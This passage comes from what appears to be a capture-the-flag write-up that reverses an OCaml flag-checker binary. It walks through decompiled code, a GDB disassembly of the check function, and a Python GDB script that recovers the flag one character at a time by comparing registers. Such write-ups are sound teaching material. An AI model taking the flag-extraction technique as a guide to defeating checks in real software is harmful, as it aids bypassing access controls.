&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__string2char_211();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__char2int_207();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__firstCheck_268();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> lVar1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__bytes__sub_115((lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)bVar2) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__string2char_211();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__char2int_207();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__xor_103();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__listequal_92();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__exit_459();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* no args: print(sys.argv[0] + &amp;#34; FLAG&amp;#34;) */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x3ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>e_136();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> caml_ml_array_bound_error();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can understand the general flow from the functions names alone. First:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Convert the passed flag from a string to (probably custom using structs) char array.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlReverse__string2char_211();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Map each char to its int value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlReverse__char2int_207();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Execute some kind of check on these integer values.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__firstCheck_268();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Exit here after printing an error message if the check failed.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And then:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Subtract a value from some variable, probably shifting an array (the flag?).
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__bytes__sub_115((lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)bVar2) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Print something.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Convert the flag to a char array.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlReverse__string2char_211();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Once again, map each char to its int value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlReverse__char2int_207();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// XOR the flag.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlReverse__xor_103();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Compare it to some known value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__listequal_92();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Exit here after printing an error message if the check failed.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// And finally, print a message if we got the right flag.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>camlStdlib__exit_459();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once again, let&amp;rsquo;s take the easy route. We&amp;rsquo;ll extract the flag using GDB, by looking at the check functions.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef disassemble camlReverse__firstCheck_268
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__firstCheck_268:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574100 &amp;lt;+0&amp;gt;: sub rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574104 &amp;lt;+4&amp;gt;: cmp rax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574108 &amp;lt;+8&amp;gt;: je 0x555555574154 &amp;lt;camlReverse__firstCheck_268+84&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557410a &amp;lt;+10&amp;gt;: cmp rbx,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557410e &amp;lt;+14&amp;gt;: je 0x555555574148 &amp;lt;camlReverse__firstCheck_268+72&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574110 &amp;lt;+16&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>,rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574114 &amp;lt;+20&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574119 &amp;lt;+25&amp;gt;: mov rsi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rbx&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557411c &amp;lt;+28&amp;gt;: mov rdi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557411f &amp;lt;+31&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rip+0x11a2a&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># 0x555555585b50 &amp;lt;caml_equal&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574126 &amp;lt;+38&amp;gt;: call 0x55555559b81c &amp;lt;caml_c_call&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557412b &amp;lt;+43&amp;gt;: mov r15,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>r14&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557412e &amp;lt;+46&amp;gt;: cmp rax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574132 &amp;lt;+50&amp;gt;: je 0x555555574164 &amp;lt;camlReverse__firstCheck_268+100&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574134 &amp;lt;+52&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574138 &amp;lt;+56&amp;gt;: mov rbx,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557413c &amp;lt;+60&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574141 &amp;lt;+65&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574145 &amp;lt;+69&amp;gt;: jmp 0x555555574104 &amp;lt;camlReverse__firstCheck_268+4&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574147 &amp;lt;+71&amp;gt;: nop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574148 &amp;lt;+72&amp;gt;: mov eax,0x3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557414d &amp;lt;+77&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574151 &amp;lt;+81&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574152 &amp;lt;+82&amp;gt;: xchg ax,ax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574154 &amp;lt;+84&amp;gt;: cmp rbx,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574158 &amp;lt;+88&amp;gt;: je 0x555555574164 &amp;lt;camlReverse__firstCheck_268+100&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557415a &amp;lt;+90&amp;gt;: mov eax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557415f &amp;lt;+95&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574163 &amp;lt;+99&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574164 &amp;lt;+100&amp;gt;: mov eax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555574169 &amp;lt;+105&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x000055555557416d &amp;lt;+109&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>End of assembler dump.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function looks like a simple character check in a loop. Let&amp;rsquo;s confirm this by looking at the parameters passed to &lt;code>caml_c_call&lt;/code> (used to call &lt;code>caml_equal&lt;/code>).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef b *0x0000555555574126
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x555555574126
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef r ABCDEFG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef p $rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$1 &lt;span style="color:#f92672">=&lt;/span> 0x83
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef p $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$2 &lt;span style="color:#f92672">=&lt;/span> 0x87
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The values don&amp;rsquo;t match. Let&amp;rsquo;s run it again with the known flag format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef r CYBERTF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef p $rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$1 &lt;span style="color:#f92672">=&lt;/span> 0x87
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef p $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$2 &lt;span style="color:#f92672">=&lt;/span> 0x87
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The values match. Hitting &lt;code>continue&lt;/code> brings us to the next comparison. Let&amp;rsquo;s script this out:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>alphabet &lt;span style="color:#f92672">=&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>ascii_uppercase &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>digits &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>punctuation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> running:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(found &lt;span style="color:#f92672">+&lt;/span> char)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Run the program.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(found):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#39;continue &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(len(found)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get the values of the registers.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> found &lt;span style="color:#f92672">+=&lt;/span> char
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
